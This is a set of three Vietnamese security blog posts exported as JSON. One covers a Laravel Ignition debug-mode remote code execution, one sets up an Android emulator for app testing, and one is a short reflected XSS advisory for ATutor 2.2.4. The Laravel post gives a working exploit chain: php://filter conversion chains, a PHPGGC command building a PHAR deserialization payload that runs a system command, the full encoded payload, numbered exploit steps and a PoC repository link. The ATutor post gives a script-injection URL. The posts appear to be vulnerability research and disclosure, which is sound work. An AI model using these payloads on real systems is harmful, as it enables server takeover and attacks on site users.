[{"content":"Tản mạn \u0026ldquo;Hằng năm cứ vào cuối đông, lá ngoài đường rụng nhiều và trên không có những đám mây bàng bạc, lòng tôi lại nao nức những kỷ niệm hoang mang.\nTôi không thể nào quên được những cảm giác trong sáng ấy nảy nở trong lòng tôi như mấy cành hoa tươi mỉm cười giữa bầu trời quang đãng.\nNhững ý tưởng ấy tôi chưa lần nào ghi lên giấy, vì hồi ấy tôi không biết ghi và ngày nay tôi không nhớ hết. Nhưng mỗi lần thấy các bạn viết những nghiên cứu của bản thân mình để chia sẻ cho mọi người, lòng tôi lại tưng bừng rộn rã.\nBuổi sáng mai hôm ấy, một buổi mai đầy sương thu và gió lạnh. Tôi âu yếm ngồi lên chiếc Sirius quen thuộc rồi đi trên những con phố Hà Nội đầy tấp nập. Con đường này tôi đã quen đi lại lắm lần, nhưng lần này tự nhiên tôi thấy lạ. Cảnh vật chung quanh tôi đều thay đổi, vì chính lòng tôi đang có sự thay đổi lớn: Hôm nay tôi đi làm\u0026rdquo;\nGiữa cái thời tiết rét buốt đến độ mỗi sáng người ta sẽ đánh vật với lý trí của bản thân: dậy chuẩn bị đi làm hay xin Inlate 2 tiếng để đi ngủ thêm. Còn tôi thì vẫn như một thói quen, 6h sáng chiếc Google Home Mini đánh thức tôi dậy bằng bản nhạc \u0026ldquo;Giá như\u0026rdquo; của Chillies, một bài mà tôi rất thích trong thời gian gần đây. Trước khi rời khỏi chiếc chăn ấm của mình, đầu tiên tôi sẽ tìm cái điện thoại của mình và xem ngày hôm nay thế giới đã thay đổi được những gì, lướt 1 dạo thấy một bài Writeup vừa mới được public không lâu ở Laravel \u0026lt;= v8.4.2 debug mode: Remote code execution. Tôi dần dần chú ý vào tiêu đề của bài viết và đọc một chút nội dung trong này. Chà! một bài viết thật công phu, sáng nay tôi lại có thứ mới để nghiên cứu rồi. Vậy là tôi chuẩn bị lên đường đi làm với một cảm xúc thật tươi vui. Hôm nay tôi đi làm.\n Tản mạn vậy đủ rồi, bài viết này là bài viết về kỹ thuật chứ không phải bài văn xuôi đâu :D\n  Tất cả nội dung trong bài viết này được tham khảo trong bài viết https://www.ambionics.io/blog/laravel-debug-rce\n Laravel \u0026lt;= v8.4.2 debug mode: Remote code execution Làm cái video cho nó tín cái đã  .__h_video { position: relative; padding-bottom: 56.23%; height: 0; overflow: hidden; width: 100%; background: #000; } .__h_video img { width: 100%; height: auto; color: #000; } .__h_video .play { height: 72px; width: 72px; left: 50%; top: 50%; margin-left: -36px; margin-top: -36px; position: absolute; cursor: pointer; }  \nTrong quá trình đi test các dự án của khách hàng, mình thường xuyên thấy cái mode debug này được bật, ngày xưa còn lấy được cả APP_KEYS rồi RCE luôn server test, được ngay cái báo cáo xịn, tuy nhiên đấy là câu chuyện của Laravel 5 trở xuống thôi, còn bây giờ từ Laravel 6 trở lên thì nó sử dụng Ignition để hiển thị debug. Ignition được bật tự động trong Laravel 6 trở lên.\nIgnition \u0026lt;= 2.5.1 Ở đây mình có 1 file hello.blade.php có nội dung là {{ $username }}, nếu sử dụng một biến mà không được define thì nó sẽ trả về một lỗi như hình bên trên. Khi ta click vào Make variable Optional thì nó sẽ tự động replace {{ $username }} thành {{ $username ? '' }}. Kiểm tra log thì ta thấy được request như sau:\nNhững researcher ở Ambionics đã nghĩ đến các sử dụng chính tính năng này để có thể thay đổi nội dung của file bất kỳ\nclass MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this-\u0026gt;makeOptional($parameters); if ($output !== false) { file_put_contents($parameters[\u0026#39;viewFile\u0026#39;], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters[\u0026#39;viewFile\u0026#39;]); // [1]  $newContents = str_replace(\u0026#39;$\u0026#39;.$parameters[\u0026#39;variableName\u0026#39;], \u0026#39;$\u0026#39;.$parameters[\u0026#39;variableName\u0026#39;].\u0026#34; ?? \u0026#39;\u0026#39;\u0026#34;, $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2]  $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this-\u0026gt;generateExpectedTokens($originalTokens, $parameters[\u0026#39;variableName\u0026#39;]); if ($expectedTokens !== $newTokens) { // [3]  return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE \u0026amp;\u0026amp; $token[1] === \u0026#39;$\u0026#39;.$variableName) { $expectedTokens[] = [T_WHITESPACE, \u0026#39; \u0026#39;, $token[2]]; $expectedTokens[] = [T_COALESCE, \u0026#39;??\u0026#39;, $token[2]]; $expectedTokens[] = [T_WHITESPACE, \u0026#39; \u0026#39;, $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \u0026#34;\u0026#39;\u0026#39;\u0026#34;, $token[2]]; } } return $expectedTokens; } ... } Sau khi đọc được file path truyền vào [1] và thay thế $variableName thành variableName ?? \u0026quot; cả file ban đầu và file mới đều sẽ được mã hóa [2] và file ban đầu được thay thế bằng nội dung mới của nó. Nếu không, makeOptional sẽ trả về false [3] và file mới sẽ không được ghi. Do đó, không thể làm được gì nhiều khi sử dụng variableName.\nInput variable duy nhất còn lại là viewFile, từ đoạn code trên có thể viết lại đoạn code rút gọn như sau:\n$contents = file_get_contents($parameters[\u0026#39;viewFile\u0026#39;]); file_put_contents($parameters[\u0026#39;viewFile\u0026#39;], $contents); Đoạn code này lấy nội dung lấy từ viewFile rồi chèn trở lại viewFile. Chẳng để làm gì cả đúng không 🙃\nLog file to PHAR PHP wrappers: changing a file Có một kỹ thuật được trình bày bởi Orange Tsai http://blog.orange.tw/2018/10/. Nó sử dụng php:filter để thay đổi nội dung của file trước khi được trả về. Và bây giờ có thể sử dụng kỹ thuật này để chuyển nội dung của file bằng cách sử dụng cách sau:\n$ echo test | base64 | base64 \u0026gt; /path/to/file.txt $ cat /path/to/file.txt ZEdWemRBbz0K $f = \u0026#39;php://filter/convert.base64-decode/resource=/path/to/file.txt\u0026#39;; # Reads /path/to/file.txt, base64-decodes it, returns the result $contents = file_get_contents($f); # Base64-decodes $contents, then writes the result to /path/to/file.txt file_put_contents($f, $contents); $ cat /path/to/file.txt test Vậy có thể sửa đổi nội dung file theo cách này, tuy nhiên chúng ta cần phải sửa đổi nội dung file chỉ được với 1 dòng duy nhất\n# To base64-decode once, use: $f = \u0026#39;php://filter/read=convert.base64-decode/resource=/path/to/file.txt\u0026#39;; # OR $f = \u0026#39;php://filter/write=convert.base64-decode/resource=/path/to/file.txt\u0026#39;; Thậm chí file chứa những charset không nằm trong base64 (badchars) thì PHP bỏ qua những badchars này và vẫn decode như bình thường\n$ echo \u0026#39;:;.!!!!!ZEdWemRBbz0K:;.!!!!!\u0026#39; \u0026gt; /path/to/file.txt $f = \u0026#39;php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt\u0026#39;; $contents = file_get_contents($f); file_put_contents($f, $contents); $ cat /path/to/file.txt test Vậy giờ chúng ta cần phải tìm được 1 file mà mình có thể control được thông tin ghi vào file, ở đây chính là file log mặc định của Laravel\nWrite the log file Theo mặc định, file log của Laravel chứa mọi lỗi PHP và stack trace, được lưu trong storage/log/laravel.log. Cố gắng tạo ra lỗi để được ghi lỗi vào file log =)).\n[2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {\u0026quot;exception\u0026quot;:\u0026quot;[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions-\u0026gt;handleError() #1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents() #2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution-\u0026gt;makeOptional() #3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution-\u0026gt;run() #4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\\\Ignition\\\\Http\\\\Controllers\\\\ExecuteSolutionController-\u0026gt;__invoke() [...] #32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\\\Pipeline\\\\Pipeline-\u0026gt;Illuminate\\\\Pipeline\\\\{closure}() #33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\\\Pipeline\\\\Pipeline-\u0026gt;then() #34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\\\Foundation\\\\Http\\\\Kernel-\u0026gt;sendRequestThroughRouter() #35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\\\Foundation\\\\Http\\\\Kernel-\u0026gt;handle() #36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...') #37 {main} \u0026quot;} Vậy là chúng ta có thể có thể đưa nội dung tùy ý vào một file. Sau đó chuyển đổi file log thành file PHAR và sử dụng phar để RCE 😃\nTuy rằng nghe có vẻ dễ như vậy nhưng thật ra có rất nhiều vấn đề\nConvert file Như ở trên, ta biết rằng PHP sẽ bỏ qua bất kỳ badchar nào khi sử dụng base64-decoding. Điều này đúng, ngoại trừ một character: =. Nếu bạn sử dụng base64-decode filter một chuỗi có chứa = ở giữa, PHP sẽ tạo ra lỗi và không trả về kết quả nào.\nChúng ta có thể khắc phục được điều này nếu chúng ta có thể control được nội dung file đó. Tuy nhiên, payload chúng ta đưa vào file log chỉ là một phần rất nhỏ của nó. Ở mỗi đoạn log sẽ có 1 đoạn prefix (timestamp) -\u0026gt; Payload -\u0026gt; suffix (stack strace). Hơn nữa, payload lại xuất hiện2 lần trong file log như ví dụ dưới đây:\n[2021-01-13 11:09:46] local.ERROR: file_get_contents(PAYLOAD): failed to open stream: No such file or directory {\u0026quot;exception\u0026quot;:\u0026quot; [object] (ErrorException(code: 0): file_get_contents(PAYLOAD): failed to open stream: No such file or directory at /var/www/html/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions-\u0026gt;handleError(2, 'file_get_conten...', '/var/www/html/v...', 75, Array) Sau nhiều lần thử nghiệm, những researcher của Ambionics đã tìm ra cách để loại bỏ các phần dư thừa để lấy được Payload. Ví dụ với trường hợp như sau:\n[prefix]PAYLOAD[midfix]PAYLOAD[suffix] Cách mà họ sử dụng là sử dụng chuyển đổi bảng mã UTF-16 sang UTF-8. Vì cứ 2 byte thì sẽ được 1 char theo mã UTF-16 nên convert sang UTF-8 thì P\\0 -\u0026gt; P. Còn các cặp 2 byte ở prefix, midfix, suffix sẽ bị convert thành junk char giống như dưới đây (và phần junk này sau đó sẽ bị loại bỏ ở bước base64 decoding):\necho -ne \u0026#39;[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[Some suffix ]\u0026#39; \u0026gt; /tmp/test.txt php \u0026gt; echo file_get_contents(\u0026#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt\u0026#39;); 卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠 Ok, giờ ta đã giữ được nội dung của payload, bước tiếp theo là loại bỏ những ký tự nào không phải là ASCII là xong. Tuy nhiên có một vấn đề là nội dung Payload lại hiển thị 2 lần, chúng ta cần phải loại bỏ 1 cái đi mới đúng cấu trúc của file PHAR. Để giải quyết vấn đề này ta lại nhớ lại là UTF-16 làm việc với hai byte, nên chỉ cần thêm 1 byte vào phần giữa Payload 1 và Payload 2 (như dưới đây là thêm X vào sau D\\0) thì byte aligment của Payload thứ 2 sẽ bị lệch, dẫn đến Payload 2 bị convert thành junk chars:\necho -ne \u0026#39;[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[Some suffix ]\u0026#39; \u0026gt; /tmp/test.txt php \u0026gt; echo file_get_contents(\u0026#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt\u0026#39;); 卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠 Vậy, kết luận chúng ta sẽ có get chain cuối cùng là:\nviewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log Complete exploit steps Bước 1: Tạo PHPGGC payload và encode nó theo format trên: php -d\u0026#39;phar.readonly=0\u0026#39; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E \u0026#39;s/./\\0=00/g\u0026#39; Chú ý, chỉnh sửa một chút ở phía đầu ra Payload, thay thế dấu == thành =3D. Mình cũng k hiểu vì sao Ambionics chạy được với 2 dấu = ở cuối payload, mình chạy toàn bị lỗi\nWarning: file_get_contents(): stream filter (convert.quoted-printable-decode): invalid byte sequence in php shell code on line 1 Sau một hồi anh em debug thì phát hiện ra phải sửa 1 dấu = thành 3D thì chạy ngon nghẻ, nếu thấy xuất hiện lỗi\nWarning: file_get_contents(): iconv stream filter (\u0026quot;utf-16le\u0026quot;=\u0026gt;\u0026quot;utf-8\u0026quot;): invalid multibyte sequence in php shell code on line 1 thì phải đệm thêm 1 byte =00 vào để decode được nhé.\nBước 2: Xoá log viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/path/to/storage/logs/laravel.log  Chẳng hiểu kiểu gì bạn với sếp mình dùng cách này xoá được log mà mình phải dùng cách khác để xoá log \u0026gt;.\u0026lt;\n Bước 3: Tạo log chứa payload viewFile: P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00r=00F=00A=00g=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00u=00A=00g=00A=00A=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00T=00z=00o=00y=00O=00T=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00E=00J=001=00Z=00m=00Z=00l=00c=00k=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00c=006=00e=003=00M=006=00M=00T=00A=006=00I=00g=00A=00q=00A=00G=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=000=004=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=002=00O=00i=00J=00s=00c=00y=00A=00t=00b=00G=00E=00i=00O=003=00M=006=00N=00T=00o=00i=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00f=00X=001=00z=00O=00j=00g=006=00I=00g=00A=00q=00A=00G=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00l=00u=00a=00X=00R=00p=00Y=00W=00x=00p=00e=00m=00V=00k=00I=00j=00t=00i=00O=00j=00E=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00T=00G=00l=00t=00a=00X=00Q=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00c=00H=00J=00v=00Y=002=00V=00z=00c=002=009=00y=00c=00y=00I=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00j=00d=00X=00J=00y=00Z=00W=005=000=00I=00j=00t=00p=00O=00j=00E=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=002=00O=00i=00J=00s=00c=00y=00A=00t=00b=00G=00E=00i=00O=003=00M=006=00N=00T=00o=00i=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00f=00X=001=00z=00O=00j=00g=006=00I=00g=00A=00q=00A=00G=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00l=00u=00a=00X=00R=00p=00Y=00W=00x=00p=00e=00m=00V=00k=00I=00j=00t=00i=00O=00j=00E=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00T=00G=00l=00t=00a=00X=00Q=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00c=00H=00J=00v=00Y=002=00V=00z=00c=002=009=00y=00c=00y=00I=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00j=00d=00X=00J=00y=00Z=00W=005=000=00I=00j=00t=00p=00O=00j=00E=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00f=00Q=00U=00A=00A=00A=00B=00k=00d=00W=001=00t=00e=00Q=00Q=00A=00A=00A=00A=00G=00k=00P=009=00f=00B=00A=00A=00A=00A=00A=00x=00+=00f=009=00i=00k=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00g=00A=00A=00A=00B=000=00Z=00X=00N=000=00L=00n=00R=004=00d=00A=00Q=00A=00A=00A=00A=00G=00k=00P=009=00f=00B=00A=00A=00A=00A=00A=00x=00+=00f=009=00i=00k=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00H=00R=00l=00c=003=00R=000=00Z=00X=00N=000=00C=00Q=00/=006=00k=00s=000=00G=00x=00r=00d=00l=00r=00x=00x=007=00q=00r=009=003=00V=00/=00X=00T=002=00F=00k=00C=00A=00A=00A=00A=00R=000=00J=00N=00Q=00g=00=3D=00 Bước 4: Convert file log sang file PHAR viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log Chú ý, ở bước này có thể sử dụng utf-16le hoặc utf-16be, tuỳ theo các nào được nhé\n Mình sử dụng cách này để xóa log, khi mà nó hoạt động chính xác, sẽ k tìm thấy đoạn base64 nào cả nên output trả về là không có gì, thành ra xóa được log. Gửi request 1 lần k được thì thử vài lần xem sao nhé.\n Bước 5: Chạy PHAR deserialization viewFile: phar:///path/to/storage/logs/laravel.log Và ta được thành quả\nExploit PoC Nếu ai muốn thử nghiệm thì đợi mình build xong Docker rồi chạy nhé, tạm thời dùng tạm cái này đã nha\n$ git clone https://github.com/laravel/laravel.git $ cd laravel $ git checkout e849812 $ composer install $ composer require facade/ignition==2.5.1 $ php artisan serve Chúng mình có viết xong PoC exploit ở đây, hi vọng có ích cho mọi người ;)\nGithub: https://github.com/khanhnv-2091/laravel-8.4.2-rce\nCảm ơn anh @vigov5 và @com0tf3 đã hỗ trợ nghiên cứu CVE này.\nTham khảo  https://www.ambionics.io/blog/laravel-debug-rce   Bài chưa hết ở đây nhớ, còn phần 2 :D\n ","permalink":"https://minhtuanact.github.io/content/post/laravel-v8.4.2-debug-mode-remote-code-execution/","summary":"Tản mạn \u0026ldquo;Hằng năm cứ vào cuối đông, lá ngoài đường rụng nhiều và trên không có những đám mây bàng bạc, lòng tôi lại nao nức những kỷ niệm hoang mang.\nTôi không thể nào quên được những cảm giác trong sáng ấy nảy nở trong lòng tôi như mấy cành hoa tươi mỉm cười giữa bầu trời quang đãng.\nNhững ý tưởng ấy tôi chưa lần nào ghi lên giấy, vì hồi ấy tôi không biết ghi và ngày nay tôi không nhớ hết.","title":"Laravel \u003c= v8.4.2 debug mode: Remote code execution"},{"content":"Tự sự một chút Cuối tuần hơi rảnh lại sắp rủ bạn gái đi ăn, nên mình có download 1 app android của 1 chuỗi cửa hàng có tiếng ở Hà Nội về để xem có khuyến mại gì không. Với một pentester thì khi mình dùng cái app này mình đã ngửi thấy mùi sai sai gì rồi. Khổ nỗi 1 điều là môi trường lại config hết trên máy công ty rồi, máy ở nhà mình trước có cài mà gỡ đi mất rồi. Chẳng lẽ lại lên công ty ngồi test 😤.\nVới bản tính hơi lười của mình thì chắc chắn mình sẽ không lên công ty mà setup môi trường ở nhà luôn để test cho tiện, sau này còn phải test cái khác nữa chứ 😆\nNgồi nguyên cả một buổi sáng thì sau khi cài đủ thể loại như genymotion, nox, bluestack, koplayer đều không hỗ trợ Hyper-V, toàn yêu cầu mình tắt Hyper-V đi, trong khi Hyper-V xịn như thế, ngon như thế mà nó không support.\nKhông đầu hàng trước số phận, mình đã tìm các emulator khác support Hyper-V. Sau một hồi tìm kiếm thì thấy BlueStack có support Hyper-V nhưng đang ở bản beta, mình cài đặt 1 hồi mà nó nặng quá chẳng lên nên cho nó ra đi tìm đường cứu nước luôn.\nTiếp tục không bỏ cuộc, mình đã tìm thấy chân ái của cuộc đời mình nằm ở đây Hyper-V Android emulator support  😚\nTuy nhiên, cài đặt Emulator Android thì cần phải cài cả Android Studio, mà ổ cứng của mình có hạn nên mình đã tìm cách cài đặt mỗi Emulator thôi mà không cần cài Android Studio.\nChào mừng anh em đến phần tiếp theo 😍\nCài đặt Emulator không cần cài Android Studio Sau đây là step-by-step để cho các bạn có thể cài được Android Emulator mà không cần cài Android Studio 🤗\n  Download và cài đặt JDK, các bạn có thể cài JDK bản nào cũng được, từ 1.8 đến bản 15 mới nhất hiện nay luôn\n  Cài biến môi trường JAVA_HOME\nMở Command Prompt (Win + R, gõ cmd và nhấn Enter hoặc bất kì cách nào mà bạn có thể mở cmd.exe 😆)\nsetx JAVA_HOME \u0026#34;C:\\Program Files\\Java\\jdk-15.0.1\u0026#34; Hoặc có thể sử dụng GUI (Start -\u0026gt; Edit the system environment variables -\u0026gt; Environment variables\u0026hellip; -\u0026gt; New\u0026hellip;)\n  Ở đây mình đang cài Android Emulator cho Hyper-V nên các bạn cần phải bật Hyper-V trên máy mình lên nhé ;)\n  Download Command line tools bản cho Windows\n  Tạo một thư mục Android ở một nơi mà các bạn thích (Ở đây mình cho vào ổ E cho rộng rãi)\nGiải nén file vừa tải vào thư mục vừa tạo Tại đây cần chú ý một chút, ở đây các bạn cần phải sử dụng bí thuật này (vì cái lỗi này mà mình loay hoay hết gần buổi sáng)\nMove toàn bộ file trong thư mục cmdline-tools sang thư mục latest nằm trong thư mục cmdline-tools\n  Chúng ta sẽ được một cây thư mục như sau\ncmdline-tools └── latest ├── bin ├── lib ├── NOTICE.txt └── source.properties   Cài đặt biến môi trường ANDROID_HOME thành:\nsetx ANDROID_HOME E:\\Android   Tạo new entry cho Path trong biến môi trường:\nsetx path \u0026#34;%PATH%;%ANDROID_HOME%\\cmdline-tools\\latest\\bin\u0026#34; /m Hoặc có thể sử dụng GUI nếu các bạn thích.\n   Lưu ý: cần phải tắt CMD đi rồi bật lại để áp dụng các thay đổi.\n  Kiểm tra sdkmanager đã hoạt động chưa bằng cách gõ lệnh\nsdkmanager --list Tại đây có thể xem danh sách có sẵn của những gói mà mình có thể tải về. Nếu bị lỗi ở bước này thì kiểm tra cài đặt biến môi trường hoặc có thể post vào bài này của mình để mình kiểm tra giúp ;)\n  Tiếp theo cần cài đặt các gói như platform-tools, platform; android-*, emulator và system-images; android-*; google_apis; x86_64, trong đó * có nghĩa là phiên bản\nsdkmanager \u0026#34;platforms;android-25\u0026#34; \u0026#34;system-images;android-25;google_apis;x86_64\u0026#34; \u0026#34;platform-tools\u0026#34; \u0026#34;emulator\u0026#34;   Tiếp theo chúng ta cần chấp nhận các điều khoản, giấy phép.\nsdkmanager --licenses Ấn Y liên tọt là được nhé các bạn ;)\n  Xong bước trên là chúng ta có thể tạo được một con android ảo mới rồi ;)\navdmanager create avd -n google-api-25 -k \u0026quot;system-images;android-25;google_apis;x86_64\u0026quot;   Để xem danh sách thiết bị, gõ lệnh:\navdmanager list avd   Đi tới thư mục emulator nằm ở Android/emulator rồi gõ lệnh để khởi động máy ảo:\nemulator -avd google-api-25   Một chiếc máy Android cực xịn dành cho bạn đã khởi động lên được rồi ;)\nLưu ý Các bạn hoàn toàn có thể sử dụng cách này để cài Android Emulator lên Linux hoặc MacOS. Miễn là các bạn hiểu cấu trúc bên Linux với MacOS tương ứng với Windows là được. Chủ yếu là cài đặt biến môi trường thôi ^^\nMột số vấn đề Bạn sẽ không thể sử dụng keyboard với máy ảo được, cần được cấu hình lại bằng cách\n  Đi tới thư mục .android trong thư mục home của bạn, di chuyển tiếp vào avd/google-api-25.avd tìm đến file config.ini và sửa\nhw.keyboard=yes   Một điều hơi oái oăm nữa là mở adb lên mình là root rồi mà không có quyền ghi vào\ngeneric_x86_64:/ # whoami root generic_x86_64:/system # touch abc touch: \u0026#39;abc\u0026#39;: Read-only file system Khởi động emulator với quyền writable và disable selinux\nemulator -avd google-api-25 -writable-system -selinux disabled ➜ google-api-25.avd adb root adbd is already running as root ➜ google-api-25.avd adb disable-verity Failed to open /fstab.ranchu Maybe run adb root? ➜ google-api-25.avd adb reboot ➜ google-api-25.avd adb root restarting adbd as root ➜ google-api-25.avd adb remount remount succeeded ➜ google-api-25.avd adb shell Lúc này bạn có thể thoải mái với chiếc máy ảo mình vừa tạo ra rồi 🤧\n  Kết Cảm ơn anh @vigov5 đã support em trong suốt thời gian thực hiện cài đặt Emulator :D\nTham khảo  https://dev.to/koscheyscrag/how-to-install-android-emulator-without-installing-android-studio-3lce https://developer.android.com/studio/#downloads https://developer.android.com/studio/run/emulator https://devblogs.microsoft.com/visualstudio/hyper-v-android-emulator-support/  ","permalink":"https://minhtuanact.github.io/content/post/cai-dat-android-emulator-sao-cho-ngau/","summary":"Tự sự một chút Cuối tuần hơi rảnh lại sắp rủ bạn gái đi ăn, nên mình có download 1 app android của 1 chuỗi cửa hàng có tiếng ở Hà Nội về để xem có khuyến mại gì không. Với một pentester thì khi mình dùng cái app này mình đã ngửi thấy mùi sai sai gì rồi. Khổ nỗi 1 điều là môi trường lại config hết trên máy công ty rồi, máy ở nhà mình trước có cài mà gỡ đi mất rồi.","title":"[Pentest Android] Cài đặt Android Emulator sao cho ngầu :-?"},{"content":"Reflected XSS in ATutor 2.2.4 Software Link: https://atutor.github.io/atutor/downloads.html\nDate: 05-06-2020\nExploit Author: cm0s\nVersion \u0026lt;= 2.2.4\nVulnerability analysis The program displays data without performing data encode. This has resulted in the Reflected XSS error. themes/default/include/header.tmpl.php line \u0026lt;?php global $msg; $msg-\u0026gt;printAll(); $_base_href;?\u0026gt; Exploit Send payload:\nhttp://\u0026lt;target\u0026gt;/browse.php?search=%3Cscript%3Ealert(1)%3C%2fscript%3E ","permalink":"https://minhtuanact.github.io/content/post/reflected-xss-in-atutor-2.2.4/","summary":"Reflected XSS in ATutor 2.2.4 Software Link: https://atutor.github.io/atutor/downloads.html\nDate: 05-06-2020\nExploit Author: cm0s\nVersion \u0026lt;= 2.2.4\nVulnerability analysis The program displays data without performing data encode. This has resulted in the Reflected XSS error. themes/default/include/header.tmpl.php line \u0026lt;?php global $msg; $msg-\u0026gt;printAll(); $_base_href;?\u0026gt; Exploit Send payload:\nhttp://\u0026lt;target\u0026gt;/browse.php?search=%3Cscript%3Ealert(1)%3C%2fscript%3E 